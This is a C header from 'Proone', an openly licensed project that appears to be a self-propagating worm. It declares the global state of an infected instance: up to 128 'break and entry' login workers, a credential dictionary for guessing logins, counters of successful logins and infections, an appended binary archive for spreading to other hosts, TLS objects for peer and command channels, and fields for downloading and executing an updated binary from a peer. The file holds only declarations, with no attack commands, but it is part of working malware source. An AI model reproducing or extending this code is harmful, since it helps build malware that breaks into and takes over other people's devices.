/** \file
 * \brief The Proone instance process implementation header. This header
 *	separates the structures and macros from proone.c for ease of maintenance.
 */
/*
* Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include "pack.h"
#include "resolv.h"
#include "cred_dict.h"
#include "bitfield.h"

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <sys/types.h>

#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>

// The maximum number of the BNE worker instances.
#define PROONE_BNE_MAX_CNT	128

// The process global resources.
struct prne_global {
	// The parent process start time(CLOCK_MONOTONIC)
	struct timespec parent_start;
	// The child process start time(CLOCK_MONOTONIC)
	struct timespec child_start;
	/**
	 * \brief The boot uuid read off the platform.
	 * \see random(4)
	 */
	uint8_t boot_id[16];
	/**
	 * \brief The instance id, an uuid randomly generated on the first parent
	 * 	process initialisation. The id is preserved if shm is available on the
	 *	host.
	 * \see \c prne_shared_global
	 */
	uint8_t instance_id[16];
	/**
	 * \brief The main Pth thread handle obtained after the initialisation of
	 *	the library for convenience. Upon initialisation, the main thread of the
	 *	process becomes the "main pth thread". This handle never changes so
	 *	Proone keeps it in the global to save CPU time on the function call to
	 *	retrieve it every time it is required.
	 */
	pth_t main_pth;
	/**
	 * \brief (optional) The resolv worker. The Proone instance will operate
	 *	without the worker if it fails to launch the worker. The services that
	 *	depend on the resolv worker, the CNCP for example, will not be
	 *	operational.
	 */
	prne_resolv_t *resolv;
	pid_t parent_pid; // The parent process id
	pid_t child_pid; // The child process id obtained upon successful fork()
	/**
	 * \brief The "black hole" file descriptor is required by some workers(e.g
	 *	the CNCP). The null device is usually used if available and falls back
	 *	to the use of \c pipe() . The first element is only there to keep the
	 *	pipe open in case \c pipe() is used. Use the second element for
	 *	launching workers!
	 * \note The workers do not actually try to write anything on the black hole
	 *	file. The black hole file is only used to make \c poll() return
	 *	immediately.
	 * \see \c open_blackhole()
	 */
	int blackhole[2];
	/**
	 * \brief The backing file of the shared global. The file must be kept open
	 *	to retain the lock on the file.
	 * \see \c prne_shared_global()
	 */
	int shm_fd;
	// The recombination parameter shared among the workers
	prne_rcb_param_t rcb_param;
	// The executable host info of the instance
	prne_bin_host_t bin_host;
	// The pointer to the data vault from the process image
	uint8_t *m_dvault;
	// True if the process is the child process
	bool is_child;
	/*
	 * True if the process image contains the binary archive. The binary archive
	 * is the largest portion of the data appended to the ELF. This flag will
	 * come in handy when investigating incomplete transmission of binary data.
	 * Note that you may run Proone without the ba for debugging purposes, but
	 * you'd want to release Proone with the ba.
	 */
	bool has_ba;
	// The bit flags for the htbt hostinfo request
	uint8_t flags[prne_bf_get_size(NB_PRNE_IFLAG)];

	/*
	 * The indexed binary archive. The has_ba member can be used to determine if
	 * the executable has an empty ba or no ba at all.
	 */
	prne_bin_archive_t bin_archive;
	// The credential dictionary deserialised from the data vault
	prne_cred_dict_t cred_dict;

	// The objects for TLS
	struct {
		mbedtls_x509_crt ca; // The CA cert chain
		/**
		 * \brief The entropy source. Note that Proone makes some modiifcations
		 *	on the object to get around the issue associated with the platform
		 *	entropy source.
		 * \see \c prne_mbedtls_entropy_init()
		 */
		mbedtls_entropy_context entpy;
		/*
		 * The CTR_DRBG PRNG engine. Shared among the workers that require a
		 * cryptographically-secure PRNG.
		 */
		mbedtls_ctr_drbg_context rnd;
	} ssl;
	// The TLS objects for listen sockets
	struct {
		bool ready; // True if the objects are successfully initialised for use
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
		mbedtls_dhm_context dhm;
	} s_ssl;
	// The TLS objects for client connections
	struct {
		bool ready; // True if the objects are successfully initialised for use
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
	} c_ssl;
};

struct prne_shared_global {
	uint8_t rev; // The format revision number
	uint32_t crash_cnt; // The number of child process crash events
	// "break and entry" count - the number of successful logins
	uint64_t bne_cnt;
	/*
	 * The number of successful infections - the number of successful instance
	 * launches
	 */
	uint64_t infect_cnt;
	/*
	 * The null-terminated path to the new process image downloaded from the
	 * peer
	 */
	char upbin_path[256];
	/**
	 * \brief The arguments to exec() call, in the serialised form
	 * \see \c prne_htbt_parse_args()
	 */
	char upbin_args[1024];
	// The byte length of the contents of host_cred_data
	size_t host_cred_len;
	/**
	 * \brief The host credential data of the instance, in the serialised form.
	 * \see \c prne_dec_host_cred()
	 */
	uint8_t host_cred_data[255];
	// The preserved instance id generated on the first instance launch
	uint8_t instance_id[16];
	/**
	 * \brief The id of the instance infected the instance
	 * \see /doc/htbt.md
	 */
	uint8_t org_id[16];
};
